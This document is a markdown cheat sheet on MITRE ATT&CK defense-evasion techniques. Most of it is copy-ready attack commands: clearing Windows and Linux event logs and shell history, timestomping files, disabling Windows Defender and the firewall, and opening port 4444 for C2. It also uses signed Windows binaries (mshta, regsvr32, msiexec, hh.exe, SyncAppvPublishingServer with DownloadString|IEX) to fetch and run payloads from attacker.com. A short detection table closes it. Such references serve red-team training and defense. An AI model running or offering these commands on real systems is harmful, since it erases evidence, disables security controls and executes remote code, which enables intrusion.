# MITRE ATT&ACK: Defense Evasion (TA0005)

> Techniques to avoid detection throughout the attack lifecycle.

---

## T1027: Obfuscated Files or Information

### T1027.001: Binary Padding
- Append null bytes or random data to change file hash

### T1027.002: Software Packing
- UPX, Themida, VMProtect, Enigma

### T1027.003: Steganography
- Hide payloads in images, audio, video
- LSB steganography in PNG files

### T1027.004: Compile After Delivery
- Drop source code, compile on target
- C# compile via `csc.exe` or `MSBuild`

### T1027.005: Indicator Removal from Tools
- Strip debug symbols, PDB paths, compiler metadata
- Remove import table entries

### T1027.006: HTML Smuggling
- Embed payloads in HTML via JavaScript Blobs
- Distribute `.html` files that assemble payloads client-side

---

## T1070: Indicator Removal on Host

### T1070.001: Clear Windows Event Logs
```cmd
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

```powershell
# Clear all logs
Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }
```

### T1070.002: Clear Linux/Mac Logs
```bash
# Clear bash history
history -c
rm ~/.bash_history
ln /dev/null ~/.bash_history

# Clear syslog
sudo rm /var/log/syslog
sudo rm /var/log/auth.log

# Clear wtmp/utmp
sudo rm /var/log/wtmp
sudo rm /var/log/utmp
sudo rm /var/log/btmp
```

### T1070.003: Clear Command History
```bash
# Disable history for session
unset HISTFILE
export HISTSIZE=0
```

### T1070.004: File Deletion
```bash
# Secure deletion
shred -uf -n 35 /path/to/file

# Overwrite then delete
dd if=/dev/urandom of=/path/to/file bs=1M count=10
rm -f /path/to/file
```

### T1070.005: Network Share Connection Removal
```cmd
net use * /delete /y
```

### T1070.006: Timestomp
```powershell
# Modify file timestamps
$(Get-Item file.exe).lastwritetime = "01/01/2020 00:00:00"
$(Get-Item file.exe).creationtime = "01/01/2020 00:00:00"
```

```bash
# Linux timestomp
touch -t 202001010000.00 /path/to/file
```

### T1070.007: Clear Network Connection History
```cmd
# Clear DNS cache
ipconfig /flushdns

# Clear ARP cache
arp -d *
```

---

## T1055: Process Injection (Defense Evasion Context)

Already covered in Privilege Escalation, but primary purpose is evasion:
- Inject into legitimate processes (svchost, explorer, dllhost)
- Process hollowing to masquerade as legitimate binary
- APC injection, thread hijacking

---

## T1218: Signed Binary Proxy Execution

### T1218.001: Compiled HTML Help (hh.exe)
```cmd
hh.exe http://attacker.com/payload.hta
```

### T1218.002: Control Panel (control.exe)
```cmd
control.exe payload.cpl
```

### T1218.003: CMSTP
```cmd
# INF file execution
cmstp.exe /ni /s payload.inf
```

### T1218.004: InstallUtil
```cmd
# Execute code via .NET InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

### T1218.005: Mshta
```cmd
mshta.exe http://attacker.com/payload.hta
mshta.exe javascript:close(new ActiveXObject("WScript.Shell").Run("calc.exe"))
```

### T1218.007: Msiexec
```cmd
msiexec /q /i http://attacker.com/payload.msi
msiexec /q /n /z payload.dll
```

### T1218.008: Odbcconf
```cmd
odbcconf /s /a {regsvr payload.dll}
```

### T1218.009: Regsvcs/Regasm
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe payload.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll
```

### T1218.010: Regsvr32
```cmd
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
regsvr32 /s /u payload.dll
```

### T1218.011: Rundll32
```cmd
rundll32.exe payload.dll,EntryPoint
rundll32.exe javascript:"..mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe");
```

### T1218.012: Verclsid
```cmd
verclsid.exe /S /C {CLSID}
```

---

## T1216: Signed Script Proxy Execution

### T1216.001: Pubprn.vbs
```cmd
cscript.exe C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 "script:http://attacker.com/payload.sct"
```

### T1216.002: Syncappvpublishingserver.vbs
```cmd
cscript.exe C:\Windows\System32\SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1') | IEX)"
```

---

## T1562: Impair Defenses

### T1562.001: Disable or Modify Tools
```powershell
# Disable Windows Defender real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2

# Add exclusion path
Add-MpPreference -ExclusionPath "C:\windows\temp"
Add-MpPreference -ExclusionProcess "payload.exe"
```

### T1562.002: Disable Windows Event Logging
```cmd
# Wevtutil
wevtutil sl Security /e:false

# AuditPol
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
```

### T1562.003: Impair Command History Logging
```bash
# Disable bash history
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
```

### T1562.004: Disable or Modify System Firewall
```powershell
# Disable Windows Firewall
netsh advfirewall set allprofiles state off

# Add firewall rule for C2
netsh advfirewall firewall add rule name="Windows Update" dir=in action=allow protocol=tcp localport=4444
```

### T1562.006: Indicator Blocking
- Block security tool domains via hosts file
- Redirect AV update servers to localhost

### T1562.008: Disable Cloud Logs
- Delete CloudTrail trails (AWS)
- Delete activity logs (Azure)
- Disable VPC Flow Logs

---

## T1006: Direct Volume Access

- Raw disk access to bypass file system controls
- Read SAM/SYSTEM hives directly from disk

---

## T1497: Virtualization/Sandbox Evasion

- Check for VM artifacts (MAC addresses, processes, drivers)
- Sleep timers to evade automated analysis
- Human interaction checks (mouse movement, clicks)

---

## Detection

| Technique | Detection Method |
|---|---|
| Signed Binary Abuse | Monitor cmd.exe, powershell spawning from unusual parents (hh.exe, mshta.exe, rundll32.exe) |
| AMSI Bypass | PowerShell 4104 events, unexpected AMSI.dll loads |
| Log Clearing | Event ID 1102 (Security log cleared), 104 (System log cleared) |
| Defender Disable | Event ID 5001, 5010, 5012 (Windows Defender) |
| Firewall Changes | Event ID 4946-4950 (firewall rule changes) |
| Timestomping | Sysmon Event ID 2 (file creation time changed) |
